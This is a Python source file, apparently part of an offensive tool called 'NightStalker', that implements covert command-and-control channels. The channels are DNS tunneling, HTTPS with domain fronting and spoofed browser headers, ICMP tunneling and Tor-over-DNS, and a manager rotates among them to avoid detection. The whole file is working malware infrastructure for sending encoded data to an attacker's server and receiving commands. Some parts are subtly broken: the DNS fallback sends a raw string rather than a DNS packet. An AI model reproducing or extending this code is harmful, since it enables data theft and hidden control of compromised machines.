"""
NightStalker C2 Communication Channels
Various covert communication channels for C2 operations
"""

import os
import time
import json
import base64
import socket
import threading
import logging
import random
import string
from typing import Optional, Callable, Dict, Any
import subprocess
import struct

logger = logging.getLogger(__name__)

class BaseChannel:
    """Base class for all communication channels"""
    
    def __init__(self, name: str):
        self.name = name
        self.running = False
        self.callback = None
    
    def send(self, data: str) -> Optional[str]:
        """Send data through channel"""
        raise NotImplementedError
    
    def start_listening(self, callback: Callable):
        """Start listening for incoming data"""
        self.callback = callback
        self.running = True
    
    def stop(self):
        """Stop channel"""
        self.running = False

class DNSChannel(BaseChannel):
    """DNS tunneling channel"""
    
    def __init__(self, domain: str, nameserver: str = "8.8.8.8"):
        super().__init__("dns")
        self.domain = domain
        self.nameserver = nameserver
        self.socket = None
    
    def _encode_dns_query(self, data: str) -> str:
        """Encode data for DNS query"""
        # Base64 encode and chunk data
        encoded = base64.b64encode(data.encode()).decode()
        # Remove padding and replace special chars
        encoded = encoded.rstrip('=').replace('+', '-').replace('/', '_')
        return encoded
    
    def _decode_dns_response(self, response: str) -> str:
        """Decode DNS response"""
        try:
            # Restore padding and special chars
            response = response.replace('-', '+').replace('_', '/')
            padding = 4 - (len(response) % 4)
            if padding != 4:
                response += '=' * padding
            
            decoded = base64.b64decode(response).decode()
            return decoded
        except:
            return response
    
    def send(self, data: str) -> Optional[str]:
        """Send data via DNS query"""
        try:
            # Encode data
            encoded_data = self._encode_dns_query(data)
            
            # Create DNS query
            query = f"{encoded_data}.{self.domain}"
            
            # Send DNS query
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.nameserver]
            
            try:
                answers = resolver.resolve(query, 'TXT')
                for answer in answers:
                    return self._decode_dns_response(str(answer))
            except dns.resolver.NXDOMAIN:
                # No response, which is normal for DNS tunneling
                pass
            except Exception as e:
                logger.debug(f"DNS query failed: {e}")
                
        except ImportError:
            logger.warning("dnspython not installed, using fallback DNS method")
            return self._send_dns_fallback(data)
        except Exception as e:
            logger.error(f"DNS channel error: {e}")
        
        return None
    
    def _send_dns_fallback(self, data: str) -> Optional[str]:
        """Fallback DNS method using socket"""
        try:
            # Simple DNS query using socket
            encoded_data = self._encode_dns_query(data)
            query = f"{encoded_data}.{self.domain}"
            
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # Send to nameserver
            sock.sendto(query.encode(), (self.nameserver, 53))
            
            # Try to receive response
            try:
                response, _ = sock.recvfrom(1024)
                return response.decode()
            except socket.timeout:
                pass
            finally:
                sock.close()
                
        except Exception as e:
            logger.error(f"DNS fallback failed: {e}")
        
        return None

class HTTPSChannel(BaseChannel):
    """HTTPS channel with domain fronting"""
    
    def __init__(self, c2_url: str, front_domain: str = None):
        super().__init__("https")
        self.c2_url = c2_url
        self.front_domain = front_domain or c2_url.split('/')[2]
        self.session = None
    
    def _setup_session(self):
        """Setup HTTPS session"""
        try:
            import requests
            self.session = requests.Session()
            
            # Configure session for stealth
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            # Domain fronting
            if self.front_domain:
                self.session.headers['Host'] = self.front_domain
            
        except ImportError:
            logger.error("requests library not installed")
            self.session = None
    
    def send(self, data: str) -> Optional[str]:
        """Send data via HTTPS"""
        if not self.session:
            self._setup_session()
        
        if not self.session:
            return None
        
        try:
            # Encode data
            encoded_data = base64.b64encode(data.encode()).decode()
            
            # Send POST request
            response = self.session.post(
                self.c2_url,
                data={'data': encoded_data},
                timeout=10
            )
            
            if response.status_code == 200:
                # Decode response
                response_data = response.json()
                if 'response' in response_data:
                    return base64.b64decode(response_data['response']).decode()
            
        except Exception as e:
            logger.error(f"HTTPS channel error: {e}")
        
        return None

class ICMPChannel(BaseChannel):
    """ICMP tunneling channel"""
    
    def __init__(self, target_host: str):
        super().__init__("icmp")
        self.target_host = target_host
        self.socket = None
    
    def _setup_socket(self):
        """Setup ICMP socket"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.socket.settimeout(5)
        except PermissionError:
            logger.error("ICMP requires root/administrator privileges")
            self.socket = None
        except Exception as e:
            logger.error(f"Failed to setup ICMP socket: {e}")
            self.socket = None
    
    def send(self, data: str) -> Optional[str]:
        """Send data via ICMP"""
        if not self.socket:
            self._setup_socket()
        
        if not self.socket:
            return None
        
        try:
            # Encode data in ICMP payload
            encoded_data = base64.b64encode(data.encode()).decode()
            
            # Create ICMP packet
            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = 1
            
            # ICMP header
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
            
            # Payload
            payload = encoded_data.encode()
            
            # Calculate checksum
            packet = icmp_header + payload
            checksum = self._calculate_checksum(packet)
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
            
            # Send packet
            self.socket.sendto(icmp_header + payload, (self.target_host, 0))
            
            # Try to receive response
            try:
                response, addr = self.socket.recvfrom(1024)
                # Parse ICMP response
                icmp_response = response[20:28]  # Skip IP header
                response_payload = response[28:]
                return response_payload.decode()
            except socket.timeout:
                pass
                
        except Exception as e:
            logger.error(f"ICMP channel error: {e}")
        
        return None
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2 == 1:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16
        return ~checksum & 0xffff

class TorDNSChannel(BaseChannel):
    """Tor over DNS channel"""
    
    def __init__(self, c2_domain: str, tor_proxy: str = "127.0.0.1:9050"):
        super().__init__("tor_dns")
        self.c2_domain = c2_domain
        self.tor_proxy = tor_proxy
        self._setup_tor()
    
    def _setup_tor(self):
        """Setup Tor proxy"""
        try:
            # Set environment variables for Tor
            os.environ['ALL_PROXY'] = f'socks5://{self.tor_proxy}'
            os.environ['HTTPS_PROXY'] = f'socks5://{self.tor_proxy}'
            os.environ['HTTP_PROXY'] = f'socks5://{self.tor_proxy}'
            
            logger.info(f"Tor proxy configured: {self.tor_proxy}")
        except Exception as e:
            logger.error(f"Failed to setup Tor proxy: {e}")
    
    def send(self, data: str) -> Optional[str]:
        """Send data via Tor over DNS"""
        try:
            # Use DNS channel through Tor
            dns_channel = DNSChannel(self.c2_domain)
            return dns_channel.send(data)
        except Exception as e:
            logger.error(f"Tor DNS channel error: {e}")
        
        return None
    
    def _check_tor_connection(self) -> bool:
        """Check if Tor connection is working"""
        try:
            import requests
            response = requests.get('https://check.torproject.org/', timeout=10)
            return 'Congratulations' in response.text
        except:
            return False

class StealthManager:
    """Manages stealth features across channels"""
    
    def __init__(self):
        self.channels = {}
        self.active_channel = None
        self.rotation_interval = 300  # 5 minutes
        self.last_rotation = time.time()
    
    def add_channel(self, name: str, channel: BaseChannel):
        """Add communication channel"""
        self.channels[name] = channel
    
    def rotate_channel(self):
        """Rotate to different channel for stealth"""
        if len(self.channels) < 2:
            return
        
        available_channels = list(self.channels.keys())
        if self.active_channel in available_channels:
            available_channels.remove(self.active_channel)
        
        if available_channels:
            self.active_channel = random.choice(available_channels)
            logger.info(f"Rotated to channel: {self.active_channel}")
    
    def send(self, data: str) -> Optional[str]:
        """Send data through active channel with rotation"""
        current_time = time.time()
        
        # Rotate channel if needed
        if current_time - self.last_rotation > self.rotation_interval:
            self.rotate_channel()
            self.last_rotation = current_time
        
        # Use active channel or first available
        if not self.active_channel:
            self.active_channel = list(self.channels.keys())[0] if self.channels else None
        
        if self.active_channel and self.active_channel in self.channels:
            return self.channels[self.active_channel].send(data)
        
        return None
    
    def get_channel_status(self) -> Dict[str, bool]:
        """Get status of all channels"""
        status = {}
        for name, channel in self.channels.items():
            status[name] = channel.running
        return status

# Utility functions
def create_dns_channel(domain: str) -> DNSChannel:
    """Create DNS channel"""
    return DNSChannel(domain)

def create_https_channel(url: str, front_domain: str = None) -> HTTPSChannel:
    """Create HTTPS channel"""
    return HTTPSChannel(url, front_domain)

def create_icmp_channel(target: str) -> ICMPChannel:
    """Create ICMP channel"""
    return ICMPChannel(target)

def create_tor_dns_channel(domain: str, tor_proxy: str = "127.0.0.1:9050") -> TorDNSChannel:
    """Create Tor over DNS channel"""
    return TorDNSChannel(domain, tor_proxy)

def create_stealth_manager() -> StealthManager:
    """Create stealth manager"""
    return StealthManager() 